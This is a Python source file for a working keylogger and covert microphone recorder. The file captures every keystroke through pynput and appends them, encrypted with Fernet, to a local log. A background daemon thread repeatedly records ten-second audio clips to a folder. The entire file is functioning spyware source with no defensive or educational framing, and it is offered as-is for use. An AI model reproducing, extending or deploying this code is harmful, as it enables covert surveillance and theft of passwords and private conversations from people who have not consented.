# requires module named 'fernet' , 'cryptography'

from pynput import keyboard
from cryptography.fernet import Fernet
import sounddevice as sd
from scipy.io.wavfile import write
import os
import threading
import time

# Encryption setup
def generate_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("key.key", "rb").read()

# Load or generate key
if not os.path.exists("key.key"):
    key = generate_key()
else:
    key = load_key()

cipher = Fernet(key)
LOG_FILE = "keystrokes.log"

# Function to encrypt and save data
def encrypt_and_save(data):
    encrypted_data = cipher.encrypt(data.encode())
    with open(LOG_FILE, "ab") as file:
        file.write(encrypted_data + b"\n")

# Keylogger callback
def on_press(key):
    try:
        key_data = key.char  # Alphanumeric keys
    except AttributeError:
        key_data = f"[{key.name}]"  # Special keys (e.g., Enter, Space)
    
    print(f"Key captured: {key_data}")  # Optional: view captured keys
    encrypt_and_save(key_data)

# Audio recording setup
AUDIO_DIR = "audio_logs"
os.makedirs(AUDIO_DIR, exist_ok=True)
RECORD_DURATION = 10  # seconds

def record_audio():
    while True:
        timestamp = int(time.time())
        audio_file = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
        
        print("Recording audio...")
        sample_rate = 44100
        audio_data = sd.rec(int(RECORD_DURATION * sample_rate), samplerate=sample_rate, channels=2)
        sd.wait()  # Wait until recording is finished
        
        write(audio_file, sample_rate, audio_data)
        print(f"Audio recorded: {audio_file}")
        
        time.sleep(RECORD_DURATION * 2)  # Wait before next recording

# Start audio recording in a separate thread
audio_thread = threading.Thread(target=record_audio)
audio_thread.daemon = True
audio_thread.start()

# Start keylogger listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
